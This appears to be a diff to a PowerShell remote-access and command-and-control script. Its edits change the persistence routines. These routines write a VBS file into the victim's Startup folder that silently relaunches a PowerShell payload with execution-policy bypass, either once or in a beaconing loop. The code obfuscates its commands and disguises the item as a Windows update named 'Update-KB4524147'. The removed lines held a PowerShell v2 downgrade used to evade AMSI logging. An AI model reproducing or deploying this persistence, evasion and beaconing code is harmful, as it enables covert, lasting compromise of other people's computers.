@@ -222,6 +222,7 @@ If([System.IO.File]::Exists($Conf_File))
   $LPORT = Read-Host;
   $Local_Port = $LPORT -replace " ","";
 }
+## Default settings
 If(-not($Local_Port)){$Local_Port = "666"};
 If(-not($Local_Host)){$Local_Host = $localIpAddress};
 ## End Of venom Function ..
@@ -972,13 +973,13 @@ While($Client.Connected)
           Write-Host "   Persist                Trigger Remote Path" -ForeGroundColor green;
           Write-Host "   -------                -------------------";
           Write-Host "   Update-KB4524147.ps1   `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`n";
-          $Command = "Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -version 2 -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 Persisted (PSv2 Downgrade Attack Used) ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item test.log -Force}else{echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 Persisted (Downgrade Attack Not Used)..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item test.log -Force}";
+          $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
           $Command = Variable_Obfuscation(Character_Obfuscation($Command));
         }
         If($startup_choise -eq "Beacon" -or $startup_choise -eq "Beacon")
         {
           $BeaconTime = $Null;
-          Write-host " - Input Time to beacon home (eg. 120000): " -NoNewline;
+          Write-host " - Input Time (sec) to beacon home (eg. 60000): " -NoNewline;
           $BeaconTime = Read-Host;
           If(-not($BeaconTime)){$BeaconTime = "60000"}
           ## If Available use powershell -version 2 {AMSI Logging Evasion}
@@ -986,7 +987,7 @@ While($Client.Connected)
           Write-Host "   Persist                Remote Path (trigger)" -ForeGroundColor green;
           Write-Host "   -------                ---------------------";
           Write-Host "   Update-KB4524147.ps1   `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`n";
-          $Command = "Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`"; echo 'objShell.Run `"cmd.exe /R powershell.exe -version 2 -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 Persisted (PSv2 Downgrade Attack Used) ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item test.log -Force}else{echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`"; echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 Persisted (Downgrade Attack Not Used)..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item test.log -Force}";          
+          $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`"; echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";          
           }
         If($startup_choise -eq "RUNONCE" -or $startup_choise -eq "once")
         {
